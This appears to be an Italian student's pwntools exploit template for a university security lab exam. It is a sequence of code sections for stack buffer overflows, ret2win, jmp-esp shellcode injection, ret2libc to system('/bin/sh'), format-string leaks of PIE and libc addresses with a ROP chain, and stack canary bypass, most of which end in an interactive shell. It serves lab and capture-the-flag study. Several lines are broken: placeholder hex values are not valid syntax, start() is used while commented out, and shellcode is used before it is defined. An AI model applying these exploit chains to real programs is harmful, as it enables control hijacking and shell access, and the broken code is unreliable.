from pwn import *

'''
    File scritto con lo scopo di raggrupparci dentro tutti i possibili strumenti
    per effettuare il primo esercizio della prova di laboratorio di metodi e
    strumenti per la sicurezza informatica.

    Consente l'esecuzione nel debugger GDB o in REMOTO, decommentando l'apposita sezione.

    NECESSARIO ANALIZZARE L'ESEGUIBILE MANUALMENTE PER IL FUNZIONAMENTO

    Struttura Stack 32bit

    |        PADDING        | -> spesso NOP o lettere a caso
    |    EVENTUALE CANARY   |
    |        PADDING        | -> spesso NOP o lettere a caso
    |  INSTRUCTION POINTER  | -> (EIP) necessario
    |     RETURN ADDRESS    | -> necessario solo se non si può interrompere l'esecuzione
    |  EVENTUALI PARAMETRI  | -> necessari a volte. ATTENZIONE a metterli in little endian se LSB


'''

# UNCOMMENTA I NECESSARI
# SEZIONE 0: GDB/REMOTE/LOCAL INIZIALIZATION

# def start(argv= [], *a, **kw):
#   return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#   return remote(sys.argv[1], sys.argv[2], *a, **kw)
#   return process([exe] + argv, *a, **kw)


# UNCOMMENTA SE USI GDB
# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())

# SEZIONE 1: INIZIALIZZAZIONE

exe= './nome_eseguibile'                            # DA SOSTITUIRE

elf= context.binary= ELF(exe, checksec= False)      # ACQUISISCO IN AUTOMATICO L'ARCHITETTURA E ALTRE INFO UTILI

context.log_level= 'debug'                          # LIVELLO DI LOGGING, AIUTA COL DEBUG, MODIFICABILE IN error/warning/info/debug

padding= 69                                         # DA SOSTITUIRE

# SEZIONE 2: BASIC BUFFER OVERFLOW + STACK VARIABLES OVERWRITE

io = process(exe)

io.sendlineafter(b'?', b'A' * padding + p32(0xdeadbeef))  # SOSTUTUIRE CON LA STRINGA CHE SI DESIDERA USARE

print(io.recvall().decode())                              # DECODIFICA DELL'OUTPUT

# SEZIONE 3: RETURN TO WIN

io = start()

payload = flat(
    b'A' * padding,
    elf.functions.NOME_FUNZIONE     # INSERIRE NOME FUNZIONE
)

write('payload', payload)           # CREAZIONE DEL PAYLOAD

io.sendlineafter(b':', payload)     # SCRTITTURA DEL PAYLOAD

io.interactive()                    #AVVIO SHELL

# SEZIONE 4: RETURN TO WIN + PARAMS

# AUTOMATISMO PER TROVARE L'EIP: riceve un payload per mandare il buffer in
# overflow (cyclic) e individua la dimensione dell'offset (paro paro come in gdb)

def find_ip(payload):

    p = process(exe)
    p.sendlineafter(b':', payload)

    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(200))   # DIMENSIONE OFFSET

io = start()

payload = flat({
    offset: [
        elf.functions.hacked,   # SOSTITUIRE CON LA FUNZIOINE DESIDERATA
        0x0,
        0xPARAM1,               # SOSTITUIRE
        0xcPARAM2,              # SOSTITUIRE
    ]
})

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()

# SEZIONE 5: SHELLCODE

jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# shellcode = asm(shellcraft.cat('flag.txt'))   # se devo leggere il contenuto di un file flag
# shellcode = asm(shellcraft.sh())              # se voglio eseguire la shell remota

shellcode += asm(shellcraft.exit())             # exit dalla shell

payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    shellcode
)

write("payload", payload)

io.sendlineafter(b':', payload)

io.interactive()

# SEZIONE 6: RETURN TO LIB_C

io = start()

libc_base = 0xf7dba000
system = libc_base + 0x45040
binsh = libc_base + 0x18c338

payload = flat(
    asm('nop') * padding,
    system,
    0x0,
    binsh
)

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()

# SEZIONE 7: FORMAT STRING VULN


# SEZIONE 8: LEAK PIE + RET2LIB_C

io = start()

pop_rdi_offset = 0x12ab                         # ME LO TROVO IN ROPPER

io.sendlineafter(b':', '%{}$p'.format(15), 16)  # ESTRAGGO IL 15ESIMO ELEMENTIO DELLO STACK
io.recvuntil(b'Hello ')
leaked_addr = int(io.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

# CALCOLO DELLA PIEBASE
elf.address = leaked_addr - 0x1224              #
info("piebase: %#x", elf.address)

pop_rdi = elf.address + pop_rdi_offset

payload = flat({                                # QUESTO PAYLOAD MI SERVE A TROVARE LIB_C
    offset: [
        pop_rdi,                                # POP DI got_puts NELL'RDI
        elf.got.puts,
        elf.plt.puts,                           # ESTRAGGO L'INDIRIZZO DI PUTS DALLA GOT
        elf.symbols.vuln                        # RETURN A VULN, IN MODO DA EFFETTUARE L'OVERFLOW CON UN NUOVO PAYLOAD
    ]
})

io.sendlineafter(b':P', payload)

io.recvlines(2)  # BLANK

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_base = got_puts - 0x765f0
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_addr = libc_base + 0x48e50
info("system_addr: %#x", system_addr)
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh = libc_base + 0x18a152
info("bin_sh: %#x", bin_sh)

# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        system_addr
    ]
})

io.sendline(payload)

io.interactive()

# SEZIONE9: CANARY BYPASS

io = start()

# Leak canary value (23rd on stack)
io.sendlineafter(b'!', '%{}$p'.format(23).encode())
io.recvline()  # Blank line
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (ret2win)
payload = flat([
    offset * b'A',  # Pad to canary (64)
    canary,  # Our leaked canary (4)
    12 * b'A',  # Pad to Ret pointer (12)
    elf.symbols.hacked  # Ret2win (64 + 4 + 12 = 80)
])

io.sendlineafter(b':P', payload)

io.interactive()
